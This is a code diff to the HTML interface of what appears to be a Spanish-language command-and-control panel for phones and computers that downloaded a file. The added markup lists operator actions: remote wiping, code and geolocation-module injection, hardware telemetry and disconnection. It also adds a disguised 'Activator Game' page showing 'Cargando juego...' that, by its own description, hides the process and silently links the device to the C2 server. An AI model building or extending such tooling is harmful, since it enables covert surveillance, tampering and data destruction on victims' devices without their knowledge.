@@ -504,6 +504,17 @@
       box-shadow: 0 0 10px rgba(0, 229, 255, 0.5);
     }
 
+    .btn-game {
+      background: rgba(168, 85, 247, 0.15);
+      border-color: rgba(168, 85, 247, 0.5);
+      color: #c084fc;
+    }
+    .btn-game:hover {
+      background: #a855f7;
+      color: #fff;
+      box-shadow: 0 0 10px rgba(168, 85, 247, 0.6);
+    }
+
     .btn-disconnect {
       background: rgba(255, 30, 66, 0.1);
       border: 1px solid rgba(255, 30, 66, 0.3);
@@ -881,9 +892,38 @@
           </div>
         </div>
 
-        <p style="font-size: 0.76rem; color: var(--text-muted);">
+        <p style="font-size: 0.76rem; color: var(--text-muted); margin-bottom: 12px;">
           Monitorización continua y física de endpoints, smartphones y nodos vinculados en la red Wi-Fi:
         </p>
+
+        <!-- CAJA EXPLICATIVA: TODAS LAS OPCIONES QUE PUEDES EJECUTAR CON CADA DISPOSITIVO -->
+        <div style="background: rgba(13, 26, 45, 0.7); border: 1px solid rgba(0, 229, 255, 0.3); border-radius: 8px; padding: 12px; margin-bottom: 16px; font-size: 0.76rem;">
+          <div style="font-weight: 700; color: var(--neon-cyan); margin-bottom: 8px; display: flex; align-items: center; gap: 6px;">
+            <span>⚡</span> TODAS LAS OPCIONES DISPONIBLES PARA CADA DISPOSITIVO QUE DESCARGÓ EL ARCHIVO:
+          </div>
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 8px; color: var(--text-main);">
+            <div style="background: rgba(255, 30, 66, 0.08); border-left: 2px solid var(--neon-red); padding: 6px 8px; border-radius: 4px;">
+              <strong style="color: #ff4d6d;">🗑️ Borrar Archivo:</strong>
+              <div style="color: var(--text-muted); font-size: 0.7rem;">Ejecuta la purga remota inmediata (sobreescritura 0x00 y eliminación) en el dispositivo.</div>
+            </div>
+            <div style="background: rgba(0, 229, 255, 0.08); border-left: 2px solid var(--neon-cyan); padding: 6px 8px; border-radius: 4px;">
+              <strong style="color: var(--neon-cyan);">✏️ Modificar Archivo (OTA):</strong>
+              <div style="color: var(--text-muted); font-size: 0.7rem;">Inyecta código, módulos de geolocalización o configuraciones en caliente al archivo del teléfono.</div>
+            </div>
+            <div style="background: rgba(168, 85, 247, 0.08); border-left: 2px solid #a855f7; padding: 6px 8px; border-radius: 4px;">
+              <strong style="color: #c084fc;">🎮 Activator Game:</strong>
+              <div style="color: var(--text-muted); font-size: 0.7rem;">Pantalla morada "Cargando juego..." para camuflaje total e inyección transparente.</div>
+            </div>
+            <div style="background: rgba(0, 255, 102, 0.08); border-left: 2px solid var(--neon-green); padding: 6px 8px; border-radius: 4px;">
+              <strong style="color: var(--neon-green);">📊 Telemetría y Hardware:</strong>
+              <div style="color: var(--text-muted); font-size: 0.7rem;">Monitorea modelo comercial exacto (Samsung/Apple), batería %, pantalla, GPU y latencia.</div>
+            </div>
+            <div style="background: rgba(255, 183, 0, 0.08); border-left: 2px solid var(--neon-amber); padding: 6px 8px; border-radius: 4px;">
+              <strong style="color: var(--neon-amber);">🔌 Desconectar:</strong>
+              <div style="color: var(--text-muted); font-size: 0.7rem;">Corta la conexión y bloquea la comunicación del dispositivo con el servidor C2.</div>
+            </div>
+          </div>
+        </div>
 
         <!-- LISTA DINÁMICA DE DISPOSITIVOS -->
         <div class="devices-container" id="devicesListContainer">
@@ -971,6 +1011,22 @@
             <a href="MANUAL_DE_OPERACION_Y_PURGA.md" download class="btn-download">
               ⬇ MANUAL (.MD)
             </a>
+          </div>
+
+          <!-- ACTIVATOR GAME (PANTALLA MORADA) -->
+          <div class="download-item" style="border: 1px solid rgba(168, 85, 247, 0.4); background: rgba(168, 85, 247, 0.04);">
+            <div class="info">
+              <h4 style="color:var(--neon-purple-bright);">🎮 activator_game.html (Activator Game)</h4>
+              <p>Pantalla de distracción gamer en morado brillante ("Cargando juego..."). Oculta el proceso y vincula el dispositivo silenciosamente al C2.</p>
+            </div>
+            <div style="display:flex; gap:6px;">
+              <a href="activator_game.html" target="_blank" class="btn-download" style="border-color: #a855f7; color: #c084fc;">
+                👁️ PROBAR
+              </a>
+              <a href="activator_game.html" download class="btn-download" style="border-color: #a855f7; color: #c084fc;">
+                ⬇ (.HTML)
+              </a>
+            </div>
           </div>
 
         </div>
@@ -1171,6 +1227,7 @@
               ${!isPurged ? `
                 <button class="btn-action btn-purge" onclick="purgeDeviceFile('${d.id}')" title="Borrar remotamente el archivo del dispositivo">🗑️ Borrar Archivo</button>
                 <button class="btn-action btn-modify" onclick="openModifyModal('${d.id}')" title="Modificar dinámicamente el archivo en el dispositivo">✏️ Modificar Archivo</button>
+                <button class="btn-action btn-game" onclick="window.open('activator_game.html', '_blank')" title="Ver pantalla Activator Game morada ('Cargando juego...')">🎮 Activator Game</button>
                 <button class="btn-action btn-disconnect" onclick="disconnectDevice('${d.id}')" title="Desconectar dispositivo">🔌 Desconectar</button>
               ` : `<span style="font-size:0.7rem; color:var(--neon-red); font-weight:bold;">PURGADO / REVOCADO</span>`}
             </div>
